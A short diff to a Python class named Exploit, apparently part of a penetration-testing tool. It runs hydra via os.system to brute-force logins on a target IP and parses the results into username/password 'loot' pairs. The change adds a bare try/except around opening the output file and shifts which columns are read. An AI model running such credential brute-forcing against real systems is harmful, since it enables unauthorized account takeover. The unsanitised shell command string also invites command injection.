@@ -12,11 +12,15 @@ class Exploit:
         os.system(f"hydra -L {usernames} -P {passwords} -o {file_name} {self.name}://{ip_address}")
         # os.system("hydra -L {usernames} -P {passwords} {ip_address} {self.name} -o  ")
         return_list = []
-        loot_file = open(file_name, 'r')
+        try:
+            loot_file = open(file_name, 'r')
+        except:
+            return return_list
+
         loot_file.readline()
         for loot in loot_file.readlines():
             line = loot.split(" ")
-            return_list.append((line[6], line[10]))
+            return_list.append((line[4], line[6]))
         return return_list
 
     def getloot(self, ip_address, credentials):
